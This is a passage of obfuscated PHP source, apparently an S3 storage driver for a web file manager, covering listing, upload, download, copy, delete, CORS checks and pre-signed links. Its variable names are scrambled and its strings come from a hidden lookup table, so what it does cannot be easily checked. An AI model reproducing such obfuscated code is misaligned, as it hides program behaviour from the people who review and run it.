TEMP_FILES, !1, $ †€‹ÇŠ); if (!@file_exists($½á©ªÄ)) { return $ÈÎéÅù¦[205]; } ImageThumb::createThumb($½á©ªÄ, $Û§àØû, $†çä»œ, $†çä»œ * 10); if (@file_exists($Û§àØû)) { Cache::remove($ †€‹ÇŠ); return IO::move($Û§àØû, $Õ‹ÃÔÈÒ); } Cache::set($ †€‹ÇŠ, $ÈÎéÅù¦[197], 600); del_file($Û§àØû); return $ÈÎéÅù¦[206] . $½á©ªÄ . $ÈÎéÅù¦[74]; } public function fileOutImageServer($²–â «ª, $’¥Û•ÄÎ = 250) { $this->fileOutImage($²–â «ª, $’¥Û•ÄÎ); } public function fileNameAuto($·©şë¯£, $°ïÅûş¢, $ğ´ûÖ¨ = REPEAT_RENAME, $Ö¢¹Ú» = false) { $ÃéŞÊÎŞ =& $_SERVER[´‹ô¯Œ]; $É•šÖŞÛ = $·©şë¯£ === $ÃéŞÊÎŞ[12] ? $°ïÅûş¢ : rtrim($·©şë¯£, $ÃéŞÊÎŞ[8]) . $ÃéŞÊÎŞ[8] . $°ïÅûş¢; if ($ğ´ûÖ¨ == REPEAT_REPLACE || !$this->exist($É•šÖŞÛ) || $Ö¢¹Ú» && $ğ´ûÖ¨ != REPEAT_RENAME_FOLDER) { return $°ïÅûş¢; } if ($ğ´ûÖ¨ == REPEAT_SKIP) { return !1; } $×¥”¡ÍÜ = $ÃéŞÊÎŞ[10] . get_path_ext($°ïÅûş¢); $×¥”¡ÍÜ = $×¥”¡ÍÜ == $ÃéŞÊÎŞ[10] || $Ö¢¹Ú» ? $ÃéŞÊÎŞ[12] : $×¥”¡ÍÜ; $íÑèµ¥Õ = 1; $‹Äñ´Éî = substr($°ïÅûş¢, 0, strlen($°ïÅûş¢) - strlen($×¥”¡ÍÜ)); $Ÿ†¹§ÖË = $‹Äñ´Éî . "\x28{$íÑèµ¥Õ}\51{$×¥”¡ÍÜ}"; while ($this->exist(rtrim($·©şë¯£, $ÃéŞÊÎŞ[8]) . $ÃéŞÊÎŞ[8] . $Ÿ†¹§ÖË)) { $Ÿ†¹§ÖË = $‹Äñ´Éî . "\x28{$íÑèµ¥Õ}\x29{$×¥”¡ÍÜ}"; $íÑèµ¥Õ++; } return $Ÿ†¹§ÖË; } private function fileNameAutoList($æ°…ÇÏ‹, $ÆÕÒçØ„, $ÚóÆÆş÷ = false) { $åÕ“Œ¡ï =& $_SERVER[´‹ô¯Œ]; $´™©ë°÷ = $this->listPath($æ°…ÇÏ‹, !0); $´™©ë°÷ = array_merge($´™©ë°÷[$åÕ“Œ¡ï[85]], $´™©ë°÷[$åÕ“Œ¡ï[86]]); $Â‹ãğÃË = array_to_keyvalue($´™©ë°÷, $åÕ“Œ¡ï[12], $åÕ“Œ¡ï[32]); $Şåç´Å’ = $åÕ“Œ¡ï[10] . get_path_ext($ÆÕÒçØ„); $Şåç´Å’ = $Şåç´Å’ == $åÕ“Œ¡ï[10] || $ÚóÆÆş÷ ? $åÕ“Œ¡ï[12] : $Şåç´Å’; $™Ê“åÌ = substr($ÆÕÒçØ„, 0, strlen($ÆÕÒçØ„) - strlen($Şåç´Å’)); $‹±£€¼¶ = $™Ê“åÌ . "\x28\x30\51{$Şåç´Å’}"; for ($­îÜõÕÖ = 1; $­îÜõÕÖ <= count($Â‹ãğÃË) + 1; $­îÜõÕÖ++) { $‹±£€¼¶ = $™Ê“åÌ . "\50{$­îÜõÕÖ}\x29{$Şåç´Å’}"; if (!in_array_not_case($‹±£€¼¶, $Â‹ãğÃË)) { return $‹±£€¼¶; } } return $‹±£€¼¶; } public function listAllFiles($ˆ³‰ĞÔ™, $ƒÔúŠÆ¦) { $ÅÙÑ®¡ =& $_SERVER[´‹ô¯Œ]; if (empty($ƒÔúŠÆ¦)) { return array(); } $ûš©Ûä³ = array_keys($ƒÔúŠÆ¦); $ÛèüµÔˆ = array(); $ˆ³‰ĞÔ™ = trim($ˆ³‰ĞÔ™, $ÅÙÑ®¡[8]); foreach ($ƒÔúŠÆ¦ as $ã›ßÊá´ => $¼¼Å¬İ°) { $’úÚò‰ = ltrim(substr(trim($ã›ßÊá´, $ÅÙÑ®¡[8]), strlen($ˆ³‰ĞÔ™)), $ÅÙÑ®¡[8]); if (substr($ã›ßÊá´, -1) == $ÅÙÑ®¡[8]) { $’úÚò‰ = rtrim($’úÚò‰, $ÅÙÑ®¡[8]) . $ÅÙÑ®¡[8]; } $ÛèüµÔˆ = array_merge($ÛèüµÔˆ, $this->slicePath($’úÚò‰)); } $üîŠÃ = array(); foreach (array_unique($ÛèüµÔˆ) as $Œ´õÚ½ü) { $õçµÍÚ = array($ÅÙÑ®¡[87] => $this->getPathOuter($ÅÙÑ®¡[8] . $ˆ³‰ĞÔ™ . $ÅÙÑ®¡[8] . $Œ´õÚ½ü), $ÅÙÑ®¡[78] => 1, $ÅÙÑ®¡[79] => 0); if (substr($Œ´õÚ½ü, -1) != $ÅÙÑ®¡[8]) { $õçµÍÚ[$ÅÙÑ®¡[78]] = 0; $Ñ«†µ¸„ = $this->getPath($ˆ³‰ĞÔ™ . $ÅÙÑ®¡[8] . $Œ´õÚ½ü); if (isset($ƒÔúŠÆ¦[$Ñ«†µ¸„])) { $ˆ˜öĞÂ = $ƒÔúŠÆ¦[$Ñ«†µ¸„]; if (isset($ˆ˜öĞÂ[$ÅÙÑ®¡[79]])) { $õçµÍÚ[$ÅÙÑ®¡[79]] = intval($ˆ˜öĞÂ[$ÅÙÑ®¡[79]]); } if (isset($ˆ˜öĞÂ[$ÅÙÑ®¡[207]])) { $õçµÍÚ[$ÅÙÑ®¡[88]] = intval($ˆ˜öĞÂ[$ÅÙÑ®¡[207]]); } } } $üîŠÃ[] = $õçµÍÚ; } return $üîŠÃ; } public function slicePath($Ù€Ò‡¨£) { $œ×©‚ÌÆ =& $_SERVER[´‹ô¯Œ]; $„ıå…¶× = explode($œ×©‚ÌÆ[8], trim($Ù€Ò‡¨£, $œ×©‚ÌÆ[8])); $®«ÛˆÈÕ = 0; do { ++$®«ÛˆÈÕ; $˜ËíˆŞó[] = implode($œ×©‚ÌÆ[8], array_slice($„ıå…¶×, 0, $®«ÛˆÈÕ)) . $œ×©‚ÌÆ[8]; } while ($®«ÛˆÈÕ < count($„ıå…¶×)); $˜ËíˆŞó[count($„ıå…¶×) - 1] = $Ù€Ò‡¨£; return $˜ËíˆŞó; } public function getHost() { $Åè•Ç¨ê =& $_SERVER[´‹ô¯Œ]; $¨¦ã¼¹‚ = parse_url(trim($this->domain, $Åè•Ç¨ê[8])); $Ã¥¤ù = isset($¨¦ã¼¹‚[$Åè•Ç¨ê[208]]) ? $¨¦ã¼¹‚[$Åè•Ç¨ê[208]] : http_type(); $’†‹¥”Ò = isset($¨¦ã¼¹‚[$Åè•Ç¨ê[209]]) ? $¨¦ã¼¹‚[$Åè•Ç¨ê[209]] : $¨¦ã¼¹‚[$Åè•Ç¨ê[87]]; if (isset($¨¦ã¼¹‚[$Åè•Ç¨ê[210]])) { $’†‹¥”Ò .= $Åè•Ç¨ê[4] . $¨¦ã¼¹‚[$Åè•Ç¨ê[210]]; } return $Ã¥¤ù . $Åè•Ç¨ê[211] . $’†‹¥”Ò; } public function pathEncode($şƒ Ï®ç) { $ñçîÑÎ =& $_SERVER[´‹ô¯Œ]; return str_replace($ñçîÑÎ[212], $ñçîÑÎ[8], rawurlencode($şƒ Ï®ç)); } public function writeLog($Ó·Ò‚¡½ = '', $ˆõğ–ú­ = false) { $‡¤àÖÖÕ =& $_SERVER[´‹ô¯Œ]; $”õáó­ = in_array(ACTION, array($‡¤àÖÖÕ[213], $‡¤àÖÖÕ[214])); if (!$”õáó­ && !GLOBAL_DEBUG) { return; } $şœ Ÿë = $Ó·Ò‚¡½; static $¢óšÛÙ± = null; if (!$¢óšÛÙ±) { $¢óšÛÙ± = strtoupper($this->getType()); } $Ó·Ò‚¡½ = $¢óšÛÙ± . $‡¤àÖÖÕ[215] . $Ó·Ò‚¡½; if ($ˆõğ–ú­) { $ûêİßÃÉ = error_get_last(); if ($ûêİßÃÉ) { $Ó·Ò‚¡½ = array($Ó·Ò‚¡½, $ûêİßÃÉ); } } write_log($Ó·Ò‚¡½, $‡¤àÖÖÕ[216]); if ($”õáó­) { throw new Exception($şœ Ÿë); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($¹§ñ¿Úº) { set_timeout(); require_once SDK_DIR . $_SERVER[´‹ô¯Œ][217]; parent::__construct(); $this->_init($¹§ñ¿Úº); } public function _init($ñ»Ÿ«üâ) { $÷®şúÑ‚ =& $_SERVER[´‹ô¯Œ]; $this->config = $ñ»Ÿ«üâ; foreach ($ñ»Ÿ«üâ as $±ë×íïÅ => $²¤ş“ò) { if (isset($this->{$±ë×íïÅ})) { $this->{$±ë×íïÅ} = $²¤ş“ò; } } $this->endpoint = $ñ»Ÿ«üâ[$÷®şúÑ‚[218]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $–ÏÆ”üê = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($–ÏÆ”üê, 0, 7) == $÷®şúÑ‚[219]) { $–ÏÆ”üê = $÷®şúÑ‚[220] . substr($–ÏÆ”üê, 7); } $this->client->setEndpoint($–ÏÆ”üê); if (in_array(ACTION, array($÷®şúÑ‚[213], $÷®şúÑ‚[214]))) { $this->client->setExceptions(); } } public function setSignVersion($í¤ÜÑğ = "\x76\64") { $this->signVer = $í¤ÜÑğ; $this->client->setSignVersion($í¤ÜÑğ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $¹…Èù°¸) { return null; } } public function isBucketCors() { $ÛşÁ¯Ë¿ =& $_SERVER[´‹ô¯Œ]; $µ­”òÆß = $this->getBucketCors(); if (!$µ­”òÆß || !is_array($µ­”òÆß)) { return !1; } if (!is_array($µ­”òÆß[$ÛşÁ¯Ë¿[221]])) { $µ­”òÆß[$ÛşÁ¯Ë¿[221]] = explode($ÛşÁ¯Ë¿[50], $µ­”òÆß[$ÛşÁ¯Ë¿[221]]); } if ($µ­”òÆß[$ÛşÁ¯Ë¿[222]] != $ÛşÁ¯Ë¿[223] || !in_array($ÛşÁ¯Ë¿[223], $µ­”òÆß[$ÛşÁ¯Ë¿[221]])) { return !1; } $¬ä°ÚÅº = array_map($ÛşÁ¯Ë¿[224], $µ­”òÆß[$ÛşÁ¯Ë¿[225]]); if (!is_array($¬ä°ÚÅº)) { $¬ä°ÚÅº = array(); } $‡à¿«™ = array($ÛşÁ¯Ë¿[226], $ÛşÁ¯Ë¿[227], $ÛşÁ¯Ë¿[228], $ÛşÁ¯Ë¿[229], $ÛşÁ¯Ë¿[230]); $ß†ñğß„ = array_diff($‡à¿«™, $¬ä°ÚÅº); return empty($ß†ñğß„); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($·€ğîÌ, $¤ºŞ©­– = '', $½ÏÃÍ€Æ = REPEAT_RENAME) { $É“Ö¹êÑ = $this->setContent($·€ğîÌ, $¤ºŞ©­–); if ($É“Ö¹êÑ !== !1) { return $this->getPathOuter($·€ğîÌ); } return !1; } public function mkdir($¡³‰–·â, $¦®çµ = REPEAT_SKIP) { $à³ßÑ¤Ğ =& $_SERVER[´‹ô¯Œ]; if (empty($¡³‰–·â) && $¡³‰–·â !== $à³ßÑ¤Ğ[231]) { return !1; } if ($¦®çµ && $this->_isFolder($¡³‰–·â)) { return $this->getPathOuter($¡³‰–·â); } $áòó‰˜· = $this->setContent($¡³‰–·â, $à³ßÑ¤Ğ[12], !0); if ($áòó‰˜· !== !1) { return $this->getPathOuter($¡³‰–·â); } return !1; } public function copyFile($™úÍıô…, $¥§³œ‚¨, $°í­›Ë¡ = array()) { $õ”·Ú¢õ =& $_SERVER[´‹ô¯Œ]; $“²ùËñŒ = $this->objectMeta($™úÍıô…); if (!$“²ùËñŒ) { return !1; } if ($“²ùËñŒ[$õ”·Ú¢õ[79]] <= 1024 * 1024 * 200) { $³Û¥¨­¶ = $this->client->copyObject($this->bucket, $™úÍıô…, $this->bucket, $¥§³œ‚¨, $õ”·Ú¢õ[232], $°í­›Ë¡); } else { $³Û¥¨­¶ = $this->client->multiCopyObject($this->bucket, $™úÍıô…, $this->bucket, $¥§³œ‚¨, $°í­›Ë¡); } $³Û¥¨­¶ = $³Û¥¨­¶ ? $this->getPathOuter($¥§³œ‚¨) : !1; return $³Û¥¨­¶; } public function moveFile($Ò­Î“Í‡, $Ş¯ŸÄ¤¹) { if ($this->copyFile($Ò­Î“Í‡, $Ş¯ŸÄ¤¹)) { $this->delFile($Ò­Î“Í‡); return $this->getPathOuter($Ş¯ŸÄ¤¹); } return !1; } public function delFile($‹ëÏ¸Ìñ) { return $this->client->deleteObject($this->bucket, $‹ëÏ¸Ìñ); } public function delFolder($‹âø±å×) { $ÉÃœãØ— =& $_SERVER[´‹ô¯Œ]; if (!$this->exist($‹âø±å×)) { return !0; } $this->listItemCache = !1; $—ŠÒœÍ = $this->fileList($‹âø±å×); $this->listItemCache = !0; $ê­Ó¼Ü½ = trim($‹âø±å×, $ÉÃœãØ—[8]) . $ÉÃœãØ—[8]; if (!empty($‹âø±å×) && $‹âø±å× !== $ÉÃœãØ—[231] && !in_array($ê­Ó¼Ü½, $—ŠÒœÍ[$ÉÃœãØ—[85]])) { $—ŠÒœÍ[$ÉÃœãØ—[85]][] = $ê­Ó¼Ü½; } $ğè¹å ò = $this->delByBatch($—ŠÒœÍ[$ÉÃœãØ—[86]]); if (!$ğè¹å ò) { return !1; } $ğè¹å ò = $this->delByBatch($—ŠÒœÍ[$ÉÃœãØ—[85]]); if (!$ğè¹å ò) { return !1; } return $this->delFile($ê­Ó¼Ü½); } private function delByBatch($æä€ô€Á) { foreach (array_chunk($æä€ô€Á, 1000) as $¬œé²²½) { $ĞŠÖ¦°³ = $this->client->deleteObjects($this->bucket, $¬œé²²½); if (!$ĞŠÖ¦°³) { return !1; } } return !0; } public function rename($ÍÔ†ìº©, $Ö¢Òåà») { return $this->renameObject($ÍÔ†ìº©, $Ö¢Òåà»); } public function listPath($êÁ…ş¥¢, $ŸÈ•ÆŠÊ = false) { $¦µ»şŒº =& $_SERVER[´‹ô¯Œ]; $¾Òô¤Ÿ® = $this->fileList($êÁ…ş¥¢, $¦µ»şŒº[8], !0); foreach ($¾Òô¤Ÿ®[$¦µ»şŒº[85]] as $¸ƒĞ øº => $¸ã´ÑÓú) { $¾Òô¤Ÿ®[$¦µ»şŒº[85]][$¸ƒĞ øº] = $this->folderInfo($¸ã´ÑÓú, $ŸÈ•ÆŠÊ, $¸ã´ÑÓú); } foreach ($¾Òô¤Ÿ®[$¦µ»şŒº[86]] as $¸ƒĞ øº => $¸ã´ÑÓú) { $¾Òô¤Ÿ®[$¦µ»şŒº[86]][$¸ƒĞ øº] = $this->fileInfo($¸ã´ÑÓú[$¦µ»şŒº[32]], $ŸÈ•ÆŠÊ, $¸ã´ÑÓú); } return $¾Òô¤Ÿ®; } protected function infoChildren($º—İ–Ìù, &$‚ñ©Õ) { $µÃñÍš³ =& $_SERVER[´‹ô¯Œ]; $«êÈş¶¡ = $this->fileList($º—İ–Ìù, $µÃñÍš³[12], !0); $‚ñ©Õ[$µÃñÍš³[81]] += count($«êÈş¶¡[$µÃñÍš³[85]]); $‚ñ©Õ[$µÃñÍš³[80]] += count($«êÈş¶¡[$µÃñÍš³[86]]); foreach ($«êÈş¶¡[$µÃñÍš³[86]] as $ó¬õĞô¨) { if (!$ó¬õĞô¨ || !$ó¬õĞô¨[$µÃñÍš³[79]]) { continue; } $‚ñ©Õ[$µÃñÍš³[79]] += $ó¬õĞô¨[$µÃñÍš³[79]]; } } private function fileInfo($°‘œ ™Ğ, $¼åÓ³¶ = false, $äî©‹“ş = array()) { $äã°¾Ë =& $_SERVER[´‹ô¯Œ]; $µµíº¯ = array($äã°¾Ë[32] => $this->pathThis($°‘œ ™Ğ), $äã°¾Ë[87] => $this->getPathOuter($°‘œ ™Ğ), $äã°¾Ë[33] => $äã°¾Ë[233], $äã°¾Ë[169] => $this->ext($°‘œ ™Ğ), $äã°¾Ë[79] => isset($äî©‹“ş[$äã°¾Ë[79]]) ? $äî©‹“ş[$äã°¾Ë[79]] : 0); if ($¼åÓ³¶) { return $µµíº¯; } $µµíº¯[$äã°¾Ë[234]] = $µµíº¯[$äã°¾Ë[88]] = 0; $µµíº¯[$äã°¾Ë[235]] = $µµíº¯[$äã°¾Ë[236]] = !0; if (empty($äî©‹“ş)) { $äî©‹“ş = $this->objectMeta($°‘œ ™Ğ); if (!$äî©‹“ş) { return $µµíº¯; } } if (isset($äî©‹“ş[$äã°¾Ë[237]]) && $äî©‹“ş[$äã°¾Ë[237]]) { $µµíº¯[$äã°¾Ë[238]] = $äî©‹“ş[$äã°¾Ë[237]]; } if (isset($äî©‹“ş[$äã°¾Ë[207]])) { $µµíº¯[$äã°¾Ë[88]] = $äî©‹“ş[$äã°¾Ë[207]]; } if (isset($äî©‹“ş[$äã°¾Ë[79]])) { $µµíº¯[$äã°¾Ë[79]] = $äî©‹“ş[$äã°¾Ë[79]]; } return $µµíº¯; } private function folderInfo($ƒ¸£ü¿, $ÊäÈ¶Üâ = false, $î­Á—üÒ = array()) { $™€œºÍŞ =& $_SERVER[´‹ô¯Œ]; $şæÙÅğó = array($™€œºÍŞ[32] => $this->pathThis($ƒ¸£ü¿), $™€œºÍŞ[87] => $this->getPathOuter($™€œºÍŞ[8] . $ƒ¸£ü¿), $™€œºÍŞ[33] => $™€œºÍŞ[78]); if ($ÊäÈ¶Üâ) { return $şæÙÅğó; } $şæÙÅğó[$™€œºÍŞ[234]] = $şæÙÅğó[$™€œºÍŞ[88]] = 0; $şæÙÅğó[$™€œºÍŞ[235]] = $şæÙÅğó[$™€œºÍŞ[236]] = !0; if ($ƒ¸£ü¿ == $™€œºÍŞ[12]) { return $şæÙÅğó; } if (empty($î­Á—üÒ)) { $î­Á—üÒ = $this->objectMeta(trim($ƒ¸£ü¿, $™€œºÍŞ[8]) . $™€œºÍŞ[8]); } if (isset($î­Á—üÒ[$™€œºÍŞ[207]])) { $şæÙÅğó[$™€œºÍŞ[234]] = $î­Á—üÒ[$™€œºÍŞ[207]]; } return $şæÙÅğó; } private function fileList($Şø¨Èığ, $´¨ˆ«ó¯ = '', $¨œÇ«·æ = 0) { $§Š…³À =& $_SERVER[´‹ô¯Œ]; $ŠÂô¬ ¹ = rtrim($Şø¨Èığ, $§Š…³À[8]) . $§Š…³À[8]; $Â×ã´ı = $this->listObjs($ŠÂô¬ ¹, null, null, $´¨ˆ«ó¯); if (!$Â×ã´ı) { return array($§Š…³À[85] => array(), $§Š…³À[86] => array()); } $í÷¦şê‡ = $®İÛ½æº = array(); foreach ($Â×ã´ı[$§Š…³À[239]] as $…€İ—ø—) { $¹è­İË¥ = $…€İ—ø—[$§Š…³À[32]]; if ($¹è­İË¥ == $ŠÂô¬ ¹) { continue; } $û‚š¸ä· = isset($…€İ—ø—[$§Š…³À[79]]) ? $…€İ—ø—[$§Š…³À[79]] : 0; $Ã€Ÿ Ÿà = $û‚š¸ä· == 0 && substr($¹è­İË¥, strlen($¹è­İË¥) - 1, 1) == $§Š…³À[8] ? !0 : !1; $this->cacheMethodInfoSet($¹è­İË¥, $Ã€Ÿ Ÿà, $…€İ—ø—); if ($Ã€Ÿ Ÿà) { $í÷¦şê‡[] = $¹è­İË¥; continue; } $®İÛ½æº[] = $¨œÇ«·æ ? $…€İ—ø— : $¹è­İË¥; } foreach ($Â×ã´ı[$§Š…³À[240]] as $…€İ—ø—) { $í÷¦şê‡[] = $…€İ—ø—[$§Š…³À[32]]; $this->cacheMethodInfoSet($…€İ—ø—[$§Š…³À[32]], !0); } $this->cacheMethodInfoSet($Şø¨Èığ, !0); return array($§Š…³À[85] => $í÷¦şê‡, $§Š…³À[86] => $®İÛ½æº); } private function listObjs($çàÅ‡÷¥, $ßçÎ û = null, $âÎä«Ö¥ = null, $×²µ¼û‚ = null) { $ˆ„Ó¿§¨ =& $_SERVER[´‹ô¯Œ]; $çàÅ‡÷¥ = trim($çàÅ‡÷¥, $ˆ„Ó¿§¨[8]); $ü³­Áâ¶ = empty($çàÅ‡÷¥) && $çàÅ‡÷¥ !== $ˆ„Ó¿§¨[231] ? $ˆ„Ó¿§¨[12] : $çàÅ‡÷¥ . $ˆ„Ó¿§¨[8]; return $this->client->getBucket($this->bucket, $ü³­Áâ¶, $ßçÎ û, $âÎä«Ö¥, $×²µ¼û‚, !0); } public function has($™İ¢ŠØİ, $ô˜§Ö¼… = false, $’âÌ· = true) { $¥Ö¬Åæ€ =& $_SERVER[´‹ô¯Œ]; $™İ¢ŠØİ = trim($™İ¢ŠØİ, $¥Ö¬Åæ€[8]); $ú–µ°ã = empty($™İ¢ŠØİ) && $™İ¢ŠØİ !== $¥Ö¬Åæ€[231] ? $¥Ö¬Åæ€[12] : $™İ¢ŠØİ . $¥Ö¬Åæ€[8]; $ğåÂƒ› = null; $¯œË†‰¼ = 500; $òõÌÎÌÃ = $¥Ö¬Åæ€[8]; $Æ»Ñüä¬ = $İªñı–› = array(); while (!0) { $¤ÆÙ˜çØ = $this->listObjs($™İ¢ŠØİ, $ğåÂƒ›, $¯œË†‰¼, $òõÌÎÌÃ); if (!$¤ÆÙ˜çØ) { break; } $ğåÂƒ› = $¤ÆÙ˜çØ[$¥Ö¬Åæ€[241]]; $âˆ‘¬¤è = $¤ÆÙ˜çØ[$¥Ö¬Åæ€[239]]; $™Ğ‹Áë = $¤ÆÙ˜çØ[$¥Ö¬Åæ€[240]]; if (empty($âˆ‘¬¤è) && empty($™Ğ‹Áë)) { break; } if (count($âˆ‘¬¤è) == 1 && $âˆ‘¬¤è[0][$¥Ö¬Åæ€[32]] == $ú–µ°ã) { break; } if ($ô˜§Ö¼…) { if (count($âˆ‘¬¤è)) { $âˆ‘¬¤è = array_column($âˆ‘¬¤è, $¥Ö¬Åæ€[32]); $Æ»Ñüä¬ = array_merge($Æ»Ñüä¬, $âˆ‘¬¤è); } if (count($™Ğ‹Áë)) { $™Ğ‹Áë = array_column($™Ğ‹Áë, $¥Ö¬Åæ€[32]); $İªñı–› = array_merge($İªñı–›, $™Ğ‹Áë); } if ($ğåÂƒ› === null) { break; } continue; } if ($’âÌ·) { if (!empty($âˆ‘¬¤è)) { if (count($âˆ‘¬¤è) > 1 || isset($âˆ‘¬¤è[0][$¥Ö¬Åæ€[32]]) && $âˆ‘¬¤è[0][$¥Ö¬Åæ€[32]] != $ú–µ°ã) { return !0; } } } else { if (!empty($™Ğ‹Áë)) { return !0; } } if ($ğåÂƒ› === null) { break; } } if ($ô˜§Ö¼…) { $Æ»Ñüä¬ = array_diff($Æ»Ñüä¬, array($ú–µ°ã)); $Æ»Ñüä¬ = count(array_unique($Æ»Ñüä¬)); $İªñı–› = count(array_unique($İªñı–›)); return array($¥Ö¬Åæ€[242] => $Æ»Ñüä¬, $¥Ö¬Åæ€[243] => $İªñı–›); } return !1; } public function listAll($Ë©€¤ß) { $”ØÒ†şÄ =& $_SERVER[´‹ô¯Œ]; $ûÙÉ ¹ğ = $this->fileList($Ë©€¤ß, $”ØÒ†şÄ[12], !0); $—•ÇÖ… = array_to_keyvalue($ûÙÉ ¹ğ[$”ØÒ†şÄ[86]], $”ØÒ†şÄ[32]); foreach ($ûÙÉ ¹ğ[$”ØÒ†şÄ[85]] as $‰ä³Ê£ª) { if (is_string($‰ä³Ê£ª)) { $—•ÇÖ…[$‰ä³Ê£ª] = array($”ØÒ†şÄ[79] => 0); } } return $this->listAllFiles($Ë©€¤ß, $—•ÇÖ…); } public function canRead($õºãâûÄ) { $ì±Ã†Æ¢ =& $_SERVER[´‹ô¯Œ]; $ì×­÷ˆÌ = $this->client->getAccessControlPolicy($this->bucket, $õºãâûÄ); if (!$ì×­÷ˆÌ) { return !1; } return in_array($ì×­÷ˆÌ, array($ì±Ã†Æ¢[244], $ì±Ã†Æ¢[245], $ì±Ã†Æ¢[246])) ? !0 : !1; } public function canWrite($ëÆá°íâ) { $ÛãÉßè =& $_SERVER[´‹ô¯Œ]; $åÇïÁø = $this->client->getAccessControlPolicy($this->bucket, $ëÆá°íâ); if (!$åÇïÁø) { return !1; } return in_array($åÇïÁø, array($ÛãÉßè[244], $ÛãÉßè[245])) ? !0 : !1; } public function getContent($‹óöÌ§ı) { return $this->client->getObject($this->bucket, $‹óöÌ§ı); } public function setContent($ç•øÂ ”, $£ç±ÔŸÓ = '', $Ü™ÛÍé– = false) { $± ‡½„é =& $_SERVER[´‹ô¯Œ]; $ç•øÂ ” = $Ü™ÛÍé– ? trim($ç•øÂ ”, $± ‡½„é[8]) . $± ‡½„é[8] : $ç•øÂ ”; $¿Û¸Ì‘Ô = get_file_mime(get_path_ext($ç•øÂ ”)); $¾»Ìô¹ = $this->client->putObject($£ç±ÔŸÓ, $this->bucket, $ç•øÂ ”, $± ‡½„é[232], array(), $¿Û¸Ì‘Ô); if (!$¾»Ìô¹) { return !1; } if ($Ü™ÛÍé–) { return !0; } return $¾»Ìô¹ ? !0 : !1; } public function fileSubstr($”ËÂÊÇ, $›øÛÀ†¬, $÷îÄÎ£¨) { $¥­Œ„€ = $›øÛÀ†¬ + $÷îÄÎ£¨ - 1; return $this->client->getObject($this->bucket, $”ËÂÊÇ, array($_SERVER[´‹ô¯Œ][247] => "\x62\171\164\x65\x73\75{$›øÛÀ†¬}\55{$¥­Œ„€}")); } public function upload($¬†Ò×£Ó, $–€Í ‹í, $ˆ®®è¯Ö = false, $à¢êö¨‡ = REPEAT_REPLACE) { $Ç€¨ÃÏö =& $_SERVER[´‹ô¯Œ]; $ƒîã¥  = array($Ç€¨ÃÏö[248] => @md5_file($–€Í ‹í)); $£Ğõ²êÉ = array($Ç€¨ÃÏö[249] => get_file_mime(get_path_ext($¬†Ò×£Ó))); if (IO::size($–€Í ‹í) <= 1024 * 1024 * 200) { $ õ¤‡§ù = $this->client->putObjectFile($–€Í ‹í, $this->bucket, $¬†Ò×£Ó, $Ç€¨ÃÏö[232], $ƒîã¥ , $£Ğõ²êÉ); return !empty($ õ¤‡§ù) ? $this->getPathOuter($¬†Ò×£Ó) : !1; } $¨´ÒÀ = $this->client->multiUploadObject($–€Í ‹í, $this->bucket, trim($¬†Ò×£Ó, $Ç€¨ÃÏö[8]), $ƒîã¥ , $£Ğõ²êÉ); return $¨´ÒÀ ? $this->getPathOuter($¬†Ò×£Ó) : !1; } public function download($ƒóïÕ¬í, $éÒ­•û) { if (!@is_dir($this->pathFather($éÒ­•û)) && !IO::mkdir($this->pathFather($éÒ­•û))) { return !1; } $¬È‡Â = $this->client->getObject($this->bucket, $ƒóïÕ¬í, array(), $éÒ­•û); return $¬È‡Â !== !1 ? $éÒ­•û : !1; } public function link($õšÆå±ö, $¬­µëß = array()) { return $this->getPreSignedURL($õšÆå±ö, 3600 * 12, $¬­µëß); } private function getPreSignedURL($„×µµğ, $°‚×òÇ×, $âú½ä–õ = array(), $íœÕ—Šá = "\x47\105\124") { $—£™÷ç¼ =& $_SERVER[´‹ô¯Œ]; $„×µµğ = trim($„×µµğ, $—£™÷ç¼[8]); if ($this->signVer == $—£™÷ç¼[250]) { return $this->client->getPreSignedV2URL($this->bucket, $„×µµğ, $°‚×òÇ×, $íœÕ—Šá, $âú½ä–õ); } return $this->client->getPreSignedV4URL($this->bucket, $„×µµğ, $°‚×òÇ×, array(), $íœÕ—Šá, $âú½ä–õ); } public function fileOut($ÌÃ½‘æœ, $™½€°’ = false, $üÉ–ğ¢Ù = false, $ó‹û‡™æ = '') { $¾ºÂøŞÖ =& $_SERVER[´‹ô¯Œ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÌÃ½‘æœ, $™½€°’, $üÉ–ğ¢Ù, $ó‹û‡™æ); } if (!$üÉ–ğ¢Ù) { $üÉ–ğ¢Ù = $this->pathThis($ÌÃ½‘æœ); } $ÀƒºÛí = get_file_mime(get_path_ext($üÉ–ğ¢Ù)); if ($ÀƒºÛí == $¾ºÂøŞÖ[251]) { return parent::fileOut($ÌÃ½‘æœ, $™½€°’, $üÉ–ğ¢Ù, $ó‹û‡™æ); } $Â®í¬³š = array($¾ºÂøŞÖ[252] => $ÀƒºÛí); if ($™½€°’) { $Â®í¬³š[$¾ºÂøŞÖ[253]] = $¾ºÂøŞÖ[254] . rawurlencode($üÉ–ğ¢Ù); } else { } $¶ÂğÒ§ = $this->link($ÌÃ½‘æœ, $Â®í¬³š); $this->fileOutLink($¶ÂğÒ§); } public function fileOutServer($¡éŠÑ¬š, $Úõ»ÜÏÛ = false, $®ÑÄ»•À = false, $·ÙêÖş‹ = '') { parent::fileOut($¡éŠÑ¬š, $Úõ»ÜÏÛ, $®ÑÄ»•À, $·ÙêÖş‹); } public function fileOutImageServer($ÛëÌ³¨Ù, $§ÎÍÇßİ = 250) { parent::fileOutImage($ÛëÌ³¨Ù, $§ÎÍÇßİ); } public function fileOutLink($òïÜùÒ) { $íÆ×ÌÇÜ =& $_SERVER[´‹ô¯Œ]; if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($íÆ×ÌÇÜ[67], $íÆ×ÌÇÜ[66], $íÆ×ÌÇÜ[68])) && !get_url_scheme($this->endpoint) && substr($òïÜùÒ, 0, 7) == $íÆ×ÌÇÜ[219]) { $òïÜùÒ = 